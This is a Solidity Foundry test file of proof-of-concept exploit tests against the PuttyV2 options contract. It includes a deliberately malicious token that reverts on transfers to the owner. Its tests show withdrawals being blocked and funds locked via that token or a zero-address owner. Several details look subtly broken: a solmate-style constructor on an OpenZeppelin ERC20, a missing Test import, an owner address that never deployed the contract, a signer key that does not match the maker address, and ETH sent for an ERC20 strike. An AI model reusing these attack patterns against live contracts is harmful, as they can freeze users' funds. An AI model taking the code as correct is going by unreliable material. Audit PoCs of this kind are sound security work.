// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "../../src/PuttyV2.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "openzeppelin/token/ERC20/IERC20.sol";
import "openzeppelin/token/ERC721/ERC721.sol";
import "openzeppelin/token/ERC721/IERC721.sol";
import "openzeppelin/utils/cryptography/ECDSA.sol";
import "openzeppelin/utils/cryptography/EIP712.sol";
import "solmate/utils/SafeTransferLib.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/test/utils/mocks/MockERC20.sol";
import "solmate/test/utils/mocks/MockERC721.sol";

// Malicious ERC777 token that reverts on transfer to owner
contract MaliciousERC777 is ERC20 {
    address public immutable owner;
    
    constructor(address _owner) ERC20("MaliciousERC777", "M777", 18) {
        owner = _owner;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (to == owner) {
            revert("MaliciousERC777: transfer to owner not allowed");
        }
        return super.transfer(to, amount);
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (to == owner) {
            revert("MaliciousERC777: transfer to owner not allowed");
        }
        return super.transferFrom(from, to, amount);
    }
}

contract ExploitTest is Test {
    PuttyV2 public putty;
    MockERC20 public baseAsset;
    MockERC721 public nftAsset;
    MaliciousERC777 public maliciousToken;
    
    address public owner = address(0x1);
    address public maker = address(0x2);
    address public taker = address(0x3);
    
    uint256 constant STRIKE = 1000e18;
    uint256 constant PREMIUM = 100e18;
    uint256 constant DURATION = 30 days;
    uint256 constant FEE = 10; // 1%
    
    function setUp() public {
        // Deploy contracts
        baseAsset = new MockERC20("Base Asset", "BASE", 18);
        nftAsset = new MockERC721("NFT Asset", "NFT");
        maliciousToken = new MaliciousERC777(owner);
        
        // Deploy PuttyV2
        putty = new PuttyV2("https://api.putty.finance/", FEE, address(baseAsset));
        
        // Setup tokens
        baseAsset.mint(maker, STRIKE * 2);
        baseAsset.mint(taker, STRIKE * 2);
        maliciousToken.mint(maker, STRIKE * 2);
        maliciousToken.mint(taker, STRIKE * 2);
        
        // Approve Putty contract
        vm.prank(maker);
        baseAsset.approve(address(putty), type(uint256).max);
        vm.prank(taker);
        baseAsset.approve(address(putty), type(uint256).max);
        vm.prank(maker);
        maliciousToken.approve(address(putty), type(uint256).max);
        vm.prank(taker);
        maliciousToken.approve(address(putty), type(uint256).max);
        
        // Mint NFTs
        nftAsset.mint(maker, 1);
        nftAsset.mint(taker, 2);
        vm.prank(maker);
        nftAsset.setApprovalForAll(address(putty), true);
        vm.prank(taker);
        nftAsset.setApprovalForAll(address(putty), true);
    }
    
    function testExploit_ZeroAddressOwner() public {
        // Create a short put order
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,
            isLong: false,
            baseAsset: address(baseAsset),
            strike: STRIKE,
            premium: PREMIUM,
            duration: DURATION,
            expiration: block.timestamp + 100 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(2, orderHash); // maker's private key is 2
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Fill the order
        vm.prank(taker);
        uint256 positionId = putty.fillOrder(order, signature, new uint256[](0));
        
        // Wait for expiration
        vm.warp(block.timestamp + DURATION + 1);
        
        // Transfer ownership to zero address (malicious action by owner)
        vm.prank(owner);
        putty.transferOwnership(address(0));
        
        // Try to withdraw - should fail because fee transfer to zero address reverts
        vm.prank(maker);
        vm.expectRevert();
        putty.withdraw(order);
    }
    
    function testExploit_MaliciousERC777Token() public {
        // Create a short put order with malicious ERC777 token as base asset
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,
            isLong: false,
            baseAsset: address(maliciousToken),
            strike: STRIKE,
            premium: PREMIUM,
            duration: DURATION,
            expiration: block.timestamp + 100 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(2, orderHash); // maker's private key is 2
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Fill the order
        vm.prank(taker);
        uint256 positionId = putty.fillOrder(order, signature, new uint256[](0));
        
        // Wait for expiration
        vm.warp(block.timestamp + DURATION + 1);
        
        // Try to withdraw - should fail because malicious token reverts on transfer to owner
        vm.prank(maker);
        vm.expectRevert("MaliciousERC777: transfer to owner not allowed");
        putty.withdraw(order);
    }
    
    function testExploit_CallOptionExercised() public {
        // Create a short call order
        PuttyV2.ERC721Asset[] memory erc721Assets = new PuttyV2.ERC721Asset[](1);
        erc721Assets[0] = PuttyV2.ERC721Asset({
            token: address(nftAsset),
            tokenId: 1
        });
        
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: true,
            isLong: false,
            baseAsset: address(baseAsset),
            strike: STRIKE,
            premium: PREMIUM,
            duration: DURATION,
            expiration: block.timestamp + 100 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: erc721Assets
        });
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(2, orderHash); // maker's private key is 2
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Fill the order
        vm.prank(taker);
        uint256 positionId = putty.fillOrder(order, signature, new uint256[](0));
        
        // Exercise the call option
        PuttyV2.Order memory longOrder = order;
        longOrder.isLong = true;
        vm.prank(taker);
        putty.exercise{value: STRIKE}(longOrder, new uint256[](0));
        
        // Transfer ownership to zero address
        vm.prank(owner);
        putty.transferOwnership(address(0));
        
        // Try to withdraw - should fail because fee transfer to zero address reverts
        vm.prank(maker);
        vm.expectRevert();
        putty.withdraw(order);
    }
}